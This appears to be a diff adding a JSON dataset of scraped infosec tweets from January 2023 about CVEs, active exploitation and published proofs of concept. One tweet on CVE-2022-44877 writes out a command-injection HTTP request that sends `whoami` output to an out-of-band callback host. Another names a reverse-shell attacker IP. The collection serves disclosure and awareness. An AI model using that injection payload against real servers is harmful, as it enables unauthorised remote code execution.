+    "tweettext": "#APT #Oceanlotus use CobaltStrike RCE Exploit (CVE-2022-39197) to attack redteam or user. https://t.co/cVAhGJbuwe",
+    "tweettime": "2023-01-18, 15:08:05",
+    "tweeturl": "https://twitter.com/blackorbird/status/1615727736676548610",
+    "username": "blackorbird"
+}
+{
+    "tweetfavorites": 40,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 22,
+    "tweettext": "#Darkhotel use Firefox 0day exploit attack.\nCVE-2022-26485\nCVE-2022-26486 https://t.co/fKdA5tJ5Ef",
+    "tweettime": "2023-01-18, 10:04:39",
+    "tweeturl": "https://twitter.com/blackorbird/status/1615651374829809667",
+    "username": "blackorbird"
+}
+{
+    "expanded_url": [
+        "https://github.com/dbgsymbol/windows_lpe_pocs/blob/main/cve-2022-21881-io_completion-poc.cpp"
+    ],
+    "tweetfavorites": 87,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 26,
+    "tweettext": "Uploaded Poc of CVE-2022-21881 used for Chrome SBX\n\nhttps://t.co/PqWlbNzfob",
+    "tweettime": "2023-01-17, 02:38:32",
+    "tweeturl": "https://twitter.com/Paul091_/status/1615176716422631424",
+    "username": "Paul091_"
+}
+{
+    "expanded_url": [
+        "http://bit.ly/3abVdnO",
+        "https://github.com/Ridter/cve-2020-0688",
+        "http://bit.ly/2uOvItE"
+    ],
+    "tweetfavorites": 69,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 35,
+    "tweettext": "RCE on MS Exchange Server Through Fixed Cryptographic Keys (CVE-2020-0688). https://t.co/4RQfUgLh5u (+) PoC: https://t.co/pdVGZaP8D3 | https://t.co/ekT8yjYqHV (+) #MustSee #315 (2020)",
+    "tweettime": "2023-01-15, 12:00:02",
+    "tweeturl": "https://twitter.com/OPOSEC/status/1614593248659488774",
+    "username": "OPOSEC"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/01/fortios-flaw-exploited-as-zero-day-in.html?m=1"
+    ],
+    "tweetfavorites": 64,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 19,
+    "tweettext": "Hackers leveraged a zero-day #vulnerability (CVE-2022-42475) in FortiOS SSL-VPN to target governments and large organizations.\n\n(nuclei template available soon)\n\n#cybersecurity #Fortinet #0day\nhttps://t.co/3C11i5zaHF",
+    "tweettime": "2023-01-14, 19:01:25",
+    "tweeturl": "https://twitter.com/ReconOne_bk/status/1614336904597573640",
+    "username": "ReconOne_bk"
+}
+{
+    "expanded_url": [
+        "https://explore.zoom.us/en/trust/security/security-bulletin/"
+    ],
+    "tweetfavorites": 38,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 3,
+    "tweettext": "My latest contribution (CVE-2022-36928) to Zoom for Android clients before version 5.13.0 contain a path traversal vulnerability. A third party app could exploit this vulnerability to read and write to the Zoom application data directory.\nhttps://t.co/usXjko2EhS",
+    "tweettime": "2023-01-13, 18:54:02",
+    "tweeturl": "https://twitter.com/Ch0pin/status/1613972658676457474",
+    "username": "Ch0pin"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/manageengine-cve-2022-47966-iocs/"
+    ],
+    "tweetfavorites": 150,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 53,
+    "tweettext": "Indicators of Compromise for #ManageEngine CVE-2022-47966:\n🔺Log File Entries\n🔺Shodan Exposure\n🔺Potential Post-Exploitation Activities\n\nDeep-dive blog and POC will be released next week.\n\nhttps://t.co/0MQvvozGgQ\n\nAwesome effort by @JamesHorseman2, Naveen, and @hacks_zach",
+    "tweettime": "2023-01-13, 15:52:58",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1613927091426451456",
+    "username": "Horizon3Attack"
+}
+{
+    "expanded_url": [
+        "https://arstechnica.com/information-technology/2023/01/vulnerability-with-9-8-severity-in-control-web-panel-is-under-active-exploit/"
+    ],
+    "tweetfavorites": 50,
+    "tweetquotes": 3,
+    "tweetreplies": 24,
+    "tweetretweets": 27,
+    "tweettext": "Active exploitation of Centos Control Web Panel through CVE-2022-44877.  Patch issued in Oct. Exploitation is picking up. Attackers can get elevated privileges and remote code execution, leading to dangerous exploitation.  Close down this vulnerability.  \n\nhttps://t.co/k3N1Fynk4E",
+    "tweettime": "2023-01-13, 10:49:27",
+    "tweeturl": "https://twitter.com/NSA_CSDirector/status/1613850710453501955",
+    "username": "NSA_CSDirector"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/01/fortios-flaw-exploited-as-zero-day-in.html?m=1"
+    ],
+    "tweetfavorites": 38,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 12,
+    "tweettext": "A #vulnerability (CVE-2022-42475) in FortiOS SSL-VPN was exploited by hackers as a \"zero-day\" to attack governments and large organizations before #Fortinet fixed it.\n\nhttps://t.co/NWitGQH8GE",
+    "tweettime": "2023-01-13, 09:45:26",
+    "tweeturl": "https://twitter.com/AnonOpsSE/status/1613834598571560960",
+    "username": "AnonOpsSE"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/01/fortios-flaw-exploited-as-zero-day-in.html"
+    ],
+    "tweetfavorites": 227,
+    "tweetquotes": 7,
+    "tweetreplies": 4,
+    "tweetretweets": 75,
+    "tweettext": "A #vulnerability (CVE-2022-42475) in FortiOS SSL-VPN was exploited by hackers as a \"zero-day\" to attack governments and large organizations before #Fortinet fixed it.\n\nDetails: https://t.co/OPRoYakewo\n\n#infosec #cyberattack #cybersecurity #hacking",
+    "tweettime": "2023-01-13, 09:43:26",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1613834093434925059",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/momika233/CVE-2022-3656"
+    ],
+    "tweetfavorites": 124,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 49,
+    "tweettext": "https://t.co/fRV7O7cXAJ\nImperva Red Team recently disclosed a vulnerability named CVE-2022-3656, which allows the theft of sensitive documents, such as encrypted wallets and cloud provider credentials. #Chrome #GoogleForIndia",
+    "tweettime": "2023-01-13, 03:37:39",
+    "tweeturl": "https://twitter.com/momika233/status/1613742044387893249",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://github.com/Wh04m1001/CVE-2023-21752"
+    ],
+    "tweetfavorites": 161,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 41,
+    "tweettext": "PoC for arbitrary file delete vulnerability in Windows Backup service. CVE-2023-21752\nhttps://t.co/H2Ve2qYZD9",
+    "tweettime": "2023-01-12, 08:26:06",
+    "tweeturl": "https://twitter.com/momika233/status/1613452247199023105",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://gist.github.com/numanturle/c1e82c47f4cba24cff214e904c227386"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "Centos Web Panel 7 Unauthenticated Remote Code Execution - CVE-2022-44877\n#BugBounty #bugbountytips #CVE #RCE\nhttps://t.co/GAtHnXttmW",
+    "tweettime": "2023-01-12, 08:25:03",
+    "tweeturl": "https://twitter.com/momika233/status/1613451981766684673",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 187,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 57,
+    "tweettext": "Reproducing the recent #ManageEngine CVE-2022-47966 pre-auth RCE, which affects nearly all of their products, has definitely been eye-opening about some recent SAML research that flew under our radar. POC and blog to come.\n\nCredit to the original researcher @_l0gg, nice find! https://t.co/qpkNZYH3c6",
+    "tweettime": "2023-01-12, 03:42:21",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1613380836660748288",
+    "username": "Horizon3Attack"
+}
+{
+    "expanded_url": [
+        "https://github.com/michalbednarski/LeakValue"
+    ],
+    "tweetfavorites": 76,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 35,
+    "tweettext": "Writeup and exploit for CVE-2022-20452, privilege escalation on Android 13 via Parcel use-after-recycle() - https://t.co/Ql2Hlrjppl #MobileSecurity #Android #RCE by @BednarTildeOne https://t.co/oqLV0p6O5G",
+    "tweettime": "2023-01-11, 19:08:33",
+    "tweeturl": "https://twitter.com/Din3zh/status/1613251535378456591",
+    "username": "Din3zh"
+}
+{
+    "tweetfavorites": 106,
+    "tweetquotes": 3,
+    "tweetreplies": 6,
+    "tweetretweets": 40,
+    "tweettext": "🚨 Ongoing mass exploitation of CVE-2022-44877 (Centos Web Panel 7 Unauthenticated Remote Code Execution).\n\nSource: 206.189.170.136 🇺🇸\n\nMalicious Base64 payload is a reverse shell that connects to 206.189.170.136:9181\n\nThe scanning of CWP instances started around January 06th. https://t.co/PC8b9frmA9",
+    "tweettime": "2023-01-11, 18:05:08",
+    "tweeturl": "https://twitter.com/1ZRR4H/status/1613235576626372608",
+    "username": "1ZRR4H"
+}
+{
+    "expanded_url": [
+        "https://infosecwriteups.com/cve-2022-38627-a-journey-through-sqlite-injection-to-compromise-the-whole-enterprise-building-15cebd072ed6"
+    ],
+    "tweetfavorites": 80,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 33,
+    "tweettext": "Day - 4⃣ of  #100DaysOfHacking \n1. Completed 'Injections, XXE and Insecure Deserialization' part from @appsecsecurity course\n\n2. Brush up on some basic misconfigs: NFS &amp; SMTP exploitation\n\n3. CVE-2022-38627:  https://t.co/zasTnzYO0C",
+    "tweettime": "2023-01-11, 16:00:14",
+    "tweeturl": "https://twitter.com/0x_Havoc/status/1613204145892388864",
+    "username": "0x_Havoc"
+}
+{
+    "expanded_url": [
+        "https://control-webpanel.com/changelog#1669855527714-450fb335-6194"
+    ],
+    "tweetfavorites": 53,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 21,
+    "tweettext": "Heads up! We are seeing CVE-2022-44877 exploitation attempts for CWP (CentOS Web Panel/Control Web Panel) instances. This is an unauthenticated RCE. Exploitation is trivial and a PoC published. Exploitation first observed Jan 6th. \n\nMake sure to patch - https://t.co/SqOTMW6ZNG",
+    "tweettime": "2023-01-11, 10:00:41",
+    "tweeturl": "https://twitter.com/Shadowserver/status/1613113660817412099",
+    "username": "Shadowserver"
+}
+{
+    "tweetfavorites": 120,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 28,
+    "tweettext": "CVE-2022-23529 🤣",
+    "tweettime": "2023-01-11, 05:54:06",
+    "tweeturl": "https://twitter.com/chybeta/status/1613051605347336192",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html"
+    ],
+    "tweetfavorites": 224,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 57,
+    "tweettext": "CVE-2022-47966, a SAML bug lead to Pre-Auth RCE.\nManageEngine got hit, &gt;10 products (Including ADSelfService Plus, ADAudit Plus, AppManager, PMP, ServiceDesk,..) is vulnerable when SAML is enabled or even is configured.\n\nhttps://t.co/mfmWwrMReG\n#CVE-2022-47966 #SAML",
+    "tweettime": "2023-01-11, 03:37:09",
+    "tweeturl": "https://twitter.com/_l0gg/status/1613017142190026756",
+    "username": "_l0gg"
+}
+{
+    "expanded_url": [
+        "https://github.com/michalbednarski/LeakValue"
+    ],
+    "tweetfavorites": 83,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "This is a great write up for CVE-2022-20452 and Parcel Hardining in Android https://t.co/2VZbhTVLZL",
+    "tweettime": "2023-01-10, 17:29:05",
+    "tweeturl": "https://twitter.com/timstrazz/status/1612864115483246592",
+    "username": "timstrazz"
+}
+{
+    "expanded_url": [
+        "https://blog.viettelcybersecurity.com/tabshell-owassrf/",
+        "https://gist.github.com/testanull/518871a2e2057caa2bc9c6ae6634103e"
+    ],
+    "tweetfavorites": 148,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 53,
+    "tweettext": "PoC of TabShell (CVE-2022-41076). More details: https://t.co/46bN4wPCHK\n\nhttps://t.co/62TvnqxnbB",
+    "tweettime": "2023-01-10, 07:21:51",
+    "tweeturl": "https://twitter.com/momika233/status/1612711300211306499",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://github.com/s0duku/cve-2022-31705"
+    ],
+    "tweetfavorites": 118,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2022-31705 (Geekpwn 2022 Vmware EHCI OOB) POC\nhttps://t.co/iQtmJVbV3Y",
+    "tweettime": "2023-01-10, 01:38:33",
+    "tweeturl": "https://twitter.com/momika233/status/1612624908588310530",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://blog.relyze.com/2022/03/cve-2022-27643-netgear-r6700v3-upnpd.html"
+    ],
+    "tweetfavorites": 162,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 52,
+    "tweettext": "RCE on NETGEAR R6700v3 (CVE-2022-27643), buffer overflow vulnerability in Universal Plug and Play daemon (upnpd)\nWiteup by @relyze \n\nhttps://t.co/8AqTj3xmjt \n\n#embedded #iot #infosec #cybersecurity #cve https://t.co/qwFXEHpKN8",
+    "tweettime": "2023-01-09, 20:30:09",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1612547294343077900",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://gist.github.com/testanull/518871a2e2057caa2bc9c6ae6634103e",
+        "https://youtu.be/i4JcvwVuCSU"
+    ],
+    "tweetfavorites": 312,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 95,
+    "tweettext": "Exchange TabShell RCE PoC (CVE-2022-41076) \n(Just copy paste the poc from @vcslab's blog post)\nStill wondering why this vulnerability is so underrated xD\nPoC script (for copy paste purpose): https://t.co/4jLfIxXkC3\nhttps://t.co/nHrJvpxqVn",
+    "tweettime": "2023-01-09, 03:42:51",
+    "tweeturl": "https://twitter.com/testanull/status/1612293798004162560",
+    "username": "testanull"
+}
+{
+    "expanded_url": [
+        "https://defense.one/d/51-cve-2021-38003a-hole-new-world-how-a-small-leak-will-sink-a-great-browser",
+        "https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078"
+    ],
+    "tweetfavorites": 151,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 49,
+    "tweettext": "CVE-2021-38003：A Hole New World - how a small leak will sink a great browser (V8 based)\nhttps://t.co/oSuaewSdrP\nAnd another method:\nhttps://t.co/O0MX4awEFB",
+    "tweettime": "2023-01-08, 21:45:48",
+    "tweeturl": "https://twitter.com/kmkz_security/status/1612203946130526208",
+    "username": "kmkz_security"
+}
+{
+    "tweetfavorites": 470,
+    "tweetquotes": 5,
+    "tweetreplies": 11,
+    "tweetretweets": 162,
+    "tweettext": "#CVE-2022-44877 Control Web Panel Unauth #RCE \n\nPOC: \nPOST /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}}) HTTP/1.1\nHost: vuln\nContent-Type: application/x-www-form-urlencoded\n\nusername=root&amp;password=toor&amp;commit=Login https://t.co/TkSmCutTqv",
+    "tweettime": "2023-01-08, 12:46:30",
+    "tweeturl": "https://twitter.com/_0xf4n9x_/status/1612068225046675457",
+    "username": "_0xf4n9x_"
+}
+{
+    "expanded_url": [
+        "https://alephsecurity.com/2021/02/16/apport-lpe/"
+    ],
+    "tweetfavorites": 170,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 58,
+    "tweettext": "Cool writeup by @Gr33nh4t on using Apport crash handler for privilege escalation in Ubuntu (CVE-2021-25682)\n\nhttps://t.co/cLhsDMMTTl \n\n#lpe #exploit #cve #infosec #cybersecurity https://t.co/7zQkGWO5wj",
+    "tweettime": "2023-01-07, 19:30:03",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1611807395130253315",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/01/rackspace-confirms-play-ransomware-gang.html"
+    ],
+    "tweetfavorites": 47,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 29,
+    "tweettext": "Rackspace confirmed that the Play #ransomware gang was responsible for last month's breach. The attack used a zero-day exploit related to CVE-2022-41080 to gain initial access to the company's email environment.\n\nRead: https://t.co/Y6EAsqhK5s\n\n#malware #ransomware #hacking",
+    "tweettime": "2023-01-06, 14:23:30",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1611367859958972419",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/numanturle/CVE-2022-44877"
+    ],
+    "tweetfavorites": 51,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 16,
+    "tweettext": "Centos Web Panel 7 Unauthenticated Remote Code Execution - CVE-2022-44877\n#CVE #RCE  https://t.co/Ov2ENYDIKR",
+    "tweettime": "2023-01-06, 04:48:25",
+    "tweeturl": "https://twitter.com/sirifu4k1/status/1611223136254726145",
+    "username": "sirifu4k1"
+}
+{
+    "expanded_url": [
+        "https://labs.nettitude.com/blog/cve-2022-25026-cve-2022-25027-vulnerabilities-in-rocket-trufusion-enterprise/"
+    ],
+    "tweetfavorites": 53,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 31,
+    "tweettext": "Two high severity vulnerabilities have been discovered in Rocket TRUfusion Enterprise: an authentication bypass issue (CVE-2022-25026) and server-side request forgery (CVE-2022-25027).\n\nhttps://t.co/cxikpIB8jV\n\n#infosec",
+    "tweettime": "2023-01-06, 04:47:51",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1611222994524966912",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://blog.viettelcybersecurity.com/tabshell-owassrf/"
+    ],
+    "tweetfavorites": 321,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 124,
+    "tweettext": "I learned a lot about internal Powershell working when I go through TabShell bug #CVE-2022-41076. Here is the detail https://t.co/lJb7OjPzMj. And a few problems still there and may be need more investigation. with @_q5ca, @hoangnx99",
+    "tweettime": "2023-01-06, 03:26:52",
+    "tweeturl": "https://twitter.com/rskvp93/status/1611202612065628163",
+    "username": "rskvp93"
+}
+{
+    "expanded_url": [
+        "https://github.com/numanturle/CVE-2022-44877"
+    ],
+    "tweetfavorites": 127,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 28,
+    "tweettext": "Centos Web Panel 7 Unauthenticated Remote Code Execution - CVE-2022-44877\n@gaissecurity \nhttps://t.co/bTtguNbe2Q",
+    "tweettime": "2023-01-05, 17:44:13",
+    "tweeturl": "https://twitter.com/numanturle/status/1611055986105802752",
+    "username": "numanturle"
+}
+{
+    "expanded_url": [
+        "https://www.shodan.io/search/facet?query=port%3A3389+ntlm&facet=os"
+    ],
+    "tweetfavorites": 42,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 13,
+    "tweettext": "My friend Arnim R. pointed out in a private chat that a malware or published exploit code for the SPNEGO NEGOEX RCE vulnerability in Windows systems (CVE-2022-37958) could have devastating effects considering the current exposure\n\nhttps://t.co/cLKD3XEfVH https://t.co/B6Dz4mGdSq",
+    "tweettime": "2023-01-05, 12:51:03",
+    "tweeturl": "https://twitter.com/cyb3rops/status/1610982205836206082",
+    "username": "cyb3rops"
+}
+{
+    "expanded_url": [
+        "https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html?m=1",
+        "https://lwn.net/Articles/383162/"
+    ],
+    "tweetfavorites": 235,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 79,
+    "tweettext": "CVE-2022-42703: Linux kernel use-after-free on struct anon_vma \n\npreliminary analysis by Seth Jenkins: https://t.co/XLhmOqtEVZ \n\nLWN article on anon_vma: https://t.co/M2an45zISq \n\n#Linux #kernel #cve #infosec #cybersecurity https://t.co/CAYPQnL712",
+    "tweettime": "2023-01-04, 12:15:03",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1610610759188324352",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://labs.nettitude.com/blog/cve-2022-25026-cve-2022-25027-vulnerabilities-in-rocket-trufusion-enterprise/"
+    ],
+    "tweetfavorites": 80,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 34,
+    "tweettext": "CVE-2022-25026 &amp; CVE-2022-25027: Authentication Bypass and Server-Side Request Forgery in Rocket TRUfusion Enterprise.\n\nhttps://t.co/KFxamGBwb0",
+    "tweettime": "2023-01-04, 11:37:33",
+    "tweeturl": "https://twitter.com/Nettitude_Labs/status/1610601324243984384",
+    "username": "Nettitude_Labs"
+}
+{
+    "expanded_url": [
+        "https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/"
+    ],
+    "tweetfavorites": 222,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 81,
+    "tweettext": "CVE-2021-38003: vulnerability analysis and exploitation by @starlabs_sg\nV8 Javascript engine TheHole value leaking for RCE in Chromium-based browser \n\nhttps://t.co/CNdOT0IECa \n\n#chrome #cve #exploit #infosec #cybersecurity https://t.co/MITv2FRfie",
+    "tweettime": "2023-01-03, 12:15:03",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1610248371498897408",
+    "username": "0xor0ne"
+}
